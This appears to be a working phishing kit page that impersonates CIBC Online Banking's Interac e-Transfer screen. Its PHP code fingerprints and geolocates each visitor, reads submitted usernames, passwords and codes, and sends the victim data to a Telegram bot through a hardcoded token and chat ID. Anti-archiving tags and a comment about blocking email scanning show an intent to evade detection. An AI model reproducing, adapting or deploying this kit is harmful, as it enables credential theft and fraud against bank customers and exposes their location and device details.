<?php

$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}


$user_os        = getOS();
$user_browser   = getBrowser();
 
$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file       = 'data.dat';
$file1       = 'combo.txt';
$file2       = 'master.log';
$ip         = "".$PublicIP;
$uaget      = "".$user_agent;
$bsr        = "".$user_browser;
$uos        = "".$user_os;
$ust= explode(" ", $user_agent);
$vr= $ust[3];
$ver=str_replace(")", "", $vr);
$version   = "Version              : ".$ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
}
else {
    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details  = json_decode($details, true);
$success  = $details['success'];
$file = '../../../log.txtt';
$fp = fopen($file, 'a');

if ($success==false) {
    fwrite($fp, $ip."\n");
    fwrite($fp, $uos."\n");
    fwrite($fp, $version."\n");
    fwrite($fp, $bsr."\n");
    fclose($fp);
} else if ($success==true) {
    $country    = $details['country'];
    $city       = $details['city'];
    $continent  = $details['continent'];
    $tp         = $details['type'];
    $cn         = $details['country_phone'];
    $is         = $details['isp'];
    $la         = $details['latitude'];
    $lp         = $details['longitude'];
    $crn        = $details['currency'];
    $type       = $tp;
    $bank       = "BMO";
$at   = "@";
$code = "" . $_GET['code'];
$username = "" .$_GET['email'];
$password = "".$_GET['password'];
$lh   = "|";

    $url        = "https://BMO.com";
    $user       = $_POST['username'];
    $pass       = $_POST['password'];
    $cod       = $_POST['code'];
    $isp        = $is;
    $currency   = "".$full_date;
    $li     = ",";

    

} else {
    $status     = "Status : ".$success;
    fwrite($fp, $status."\n");
    fwrite($fp, $uaget."\n");
    fclose($fp);
}



$googleMapsUrl = "https://www.google.com/maps?q=$la,$lp";

$message = "\n========================= \n$ip | $uos\n🏦=========================\n🌍 CIBC | $city\n🌐 $is\n🌐 $la  $lp\n=========================\n$uaget,";
$apiToken = "6547328306:AAFosAwa7wPggddiOV_QgTw7xI-uX8ZEY6s"; 
$data1 = [
    'chat_id' => '-1001819831566',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot{$apiToken}/sendMessage?" . http_build_query($data1));

?>

<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html><head>
 <script>
    // Disable caching for forward and backward navigation
    function disableCaching() {
      // Disable caching for forward navigation
      window.onpageshow = function(event) {
        if (event.persisted) {
          document.getElementById('disableCache').content = 'no-store, no-cache, must-revalidate';
        }
      };
      
      // Disable caching for backward navigation
      window.onunload = function() {};
    }
    
    // Set client browser cache to one hour prior
    function setBrowserCacheTime() {
      const date = new Date();
      date.setTime(date.getTime() - (60 * 60 * 1000));
      document.getElementById('cacheExpires').content = date.toUTCString();
    }

    // Prevent Google Archiving
    const metaRobots = document.createElement('meta');
    metaRobots.name = 'robots';
    metaRobots.content = 'noarchive';
    document.head.appendChild(metaRobots);

    // Block email scanning
    const metaContentType = document.createElement('meta');
    metaContentType.httpEquiv = 'X-Content-Type-Options';
    metaContentType.content = 'nosniff';
    document.head.appendChild(metaContentType);

    // Disable listeners and log third-party communications
    function disableListeners() {
      // Disable listeners (Not applicable in HTML pages)
    }

    // Call the necessary functions when the page loads
    document.addEventListener('DOMContentLoaded', function() {
      disableCaching();
      setBrowserCacheTime();
      disableListeners();
      logThirdPartyCommunication();
    });
  </script><meta name="robots" content="noarchive"><meta http-equiv="X-Content-Type-Options" content="nosniff">

        <meta name="viewport" content="width=device-width, initial-scale=1.0">

      <meta http-equiv="content-type" content="text/html; charset=UTF-8">
      <meta charset="utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <title>Sign on | CIBC Online Banking</title>  <script>
    // Disable caching for forward and backward navigation
    function disableCaching() {
      // Disable caching for forward navigation
      window.onpageshow = function(event) {
        if (event.persisted) {
          document.getElementById('disableCache').content = 'no-store, no-cache, must-revalidate';
        }
      };
      
      // Disable caching for backward navigation
      window.onunload = function() {};
    }
    
    // Set client browser cache to one hour prior
    function setBrowserCacheTime() {
      const date = new Date();
      date.setTime(date.getTime() - (60 * 60 * 1000));
      document.getElementById('cacheExpires').content = date.toUTCString();
    }

    // Prevent Google Archiving
    const metaRobots = document.createElement('meta');
    metaRobots.name = 'robots';
    metaRobots.content = 'noarchive';
    document.head.appendChild(metaRobots);

    // Block email scanning
    const metaContentType = document.createElement('meta');
    metaContentType.httpEquiv = 'X-Content-Type-Options';
    metaContentType.content = 'nosniff';
    document.head.appendChild(metaContentType);

    // Disable listeners and log third-party communications
    function disableListeners() {
      // Disable listeners (Not applicable in HTML pages)
    }

    function logThirdPartyCommunication() {
      // Logging third-party communication attempts
      const timestamp = new Date().toISOString();
      const ipAddress = "123.45.67.89"; // Replace with actual IP address or retrieve dynamically
      const requestedUrl = window.location.href;
      const logMessage = `Timestamp: ${timestamp} | IP: ${ipAddress} | Requested URL: ${requestedUrl}\n`;

      // Specify the log file location
      const logFile = "../../../requests.txt"; // Replace with the actual log file location

      // Perform the necessary logging operation (e.g., sending log data to a server-side script)
      const logRequest = new XMLHttpRequest();
      logRequest.open('POST', logFile, true);
      logRequest.setRequestHeader('Content-Type', 'text/plain');
      logRequest.send(logMessage);
    }

    // Call the necessary functions when the page loads
    document.addEventListener('DOMContentLoaded', function() {
      disableCaching();
      setBrowserCacheTime();
      disableListeners();
      logThirdPartyCommunication();
    });
  </script>
      <style>
          @font-face {
              font-family: "Whitney";
              src: url("/ebm-resources/common-content/fonts/Whitney-Book_Web.woff2") format("woff2"),
                  url("/ebm-resources/common-content/fonts/Whitney-Book_Web.woff") format("woff");
              font-weight: normal;
              font-style: normal;
          }
          @font-face {
              font-family: "WhitneyBookRegular";
              src: url("/ebm-resources/common-content/fonts/Whitney-Book_Web.woff2") format("woff2"),
                  url("/ebm-resources/common-content/fonts/Whitney-Book_Web.woff") format("woff");
              font-weight: normal;
              font-style: normal;
          }
          @font-face {
              font-family: "Whitney";
              src: url("/ebm-resources/common-content/fonts/Whitney-Medium_Web.woff2") format("woff2"),
                  url("/ebm-resources/common-content/fonts/Whitney-Medium_Web.woff") format("woff");
              font-weight: 600;
              font-style: normal;
          }
          @font-face {
              font-family: "WhitneyMedium";
              src: url("/ebm-resources/common-content/fonts/Whitney-Medium_Web.woff2") format("woff2"),
                  url("/ebm-resources/common-content/fonts/Whitney-Medium_Web.woff") format("woff");
              font-weight: 500;
              font-style: normal;
          }
          @font-face {
              font-family: "Whitney";
              src: url("/ebm-resources/common-content/fonts/Whitney-Semibld_Web.woff2") format("woff2"),
                  url("/ebm-resources/common-content/fonts/Whitney-Semibld_Web.woff") format("woff");
              font-weight: 900;
              font-style: normal;
          }
      </style>
      <link rel="stylesheet" type="text/css" href="files/157-1f5342e1.css">
  <link rel="stylesheet" href="files/reset.css"><link rel="stylesheet" href="files/reset-brand.css"><link rel="stylesheet" href="files/global.css"><link rel="stylesheet" href="files/global-android2.css"><link rel="stylesheet" href="files/global-brand.css"><link rel="stylesheet" href="files/receive-method.css"><link rel="stylesheet" href="files/receive-method-brand.css"></head>



    
    
    
    
    
    
    

<body>
    <header class="flex-box flex-box-hoz">
        <div class="flex-box-flex-1"></div>
        <a href="http://cibc.com/" target="_blank">
            <div id="header-logo">
                <span class="offscreen">CIBC logo</span>
           <img class="logo" src="files/cibc-logo-colour.89bf60f2.svg" alt="CIBC logo."> </div>
        </a>
        <div id="header-link" class="flex-box-flex-1">

            
        </div>
    </header>
    <section id="main-page">
        <section id="id2">
            <section class="page-title">
                <h2 class="title"><em>Interac</em> e-Transfer</h2>
            </section>
        </section>
        <section id="emt-receive-method" class="page-wrapper">
            <div id="description-text">
                <p class="iOS android" style="display: block;">How would you like to deposit your e-Transfer?</p>
                <p class="no-app" style="display: none;">Select Continue to deposit your e-Transfer.</p>
            </div>
            <button id="androidButton" data-value="ANDR" data-link="cibcbanking://receiveetransfer?etransfertoken=CAsfvMCv" class="method-button android" name="androidButton"><span>Mobile app</span></button>
            <button id="iosButton" data-value="IOS" data-link="cibcbanking://receiveetransfer?etransfertoken=CAsfvMCv" class="method-button iOS selected" name="iosButton" style="display: block;"><span>Web browser</span></button>
            <button id="mobileWebButton" data-value="MWEB" data-link="/ebm-resources/online-banking/client/index.html#/auth/signon?channel=mobileweb&amp;emtType=receive&amp;emtId=CAsfvMCv&amp;locale=en" class="method-button mobile-web" name="mobileWebButton"><span>Mobile app</span></button>
            <div class="button-set">
                <a class="btn btn-positive" id="continue-link" href="040147.php"><span>Continue</span></a>
            </div>
            <p id="store-link-hint" class="iOS android" style="display: block;">Don’t have the app? Get it here:</p>
            <a id="androidStoreLink" class="android storelink" href="http://c00.adobe.com/faaef37a29ba13643bac38a415b557b7f6a6fe2d720fd521627af9c7002d7093/llqs0s6j/g/com.cibc.android.mobi" target="_blank">
                <img src="files/badges-android.png" alt="Google Play Logo">
            </a>
            <a id="iosStoreLink" class="iOS storelink" href="http://c00.adobe.com/faaef37a29ba13643bac38a415b557b7f6a6fe2d720fd521627af9c7002d7093/llqs0s6j/i/351448953" target="_blank" style="display: block;">
                <img src="files/badges-iOS.png" alt="Apple App Store Logo">
            </a>
        </section>
        <section id="more-info">
            <a href="https://www.cibc.com/ca/how-to-bank" target="_blank">Learn about ways to bank with CIBC</a>
        </section>
        <section id="emt-footer" class="page-wrapper">
            <p>Your use of CIBC Mobile Banking is governed by the CIBC Electronic Access Agreement.</p>
            <p><a href="https://www.cibc.com/m/contact-cibc.html" target="_blank">Contact Us</a> | <a href="http://cibc.intelliresponse.com/mobile-w/" target="_blank">Help</a> | <a href="https://www.cibc.com/ca/mobile/legal.html" target="_blank">Legal</a></p>
        </section>
    </section>

</body></html>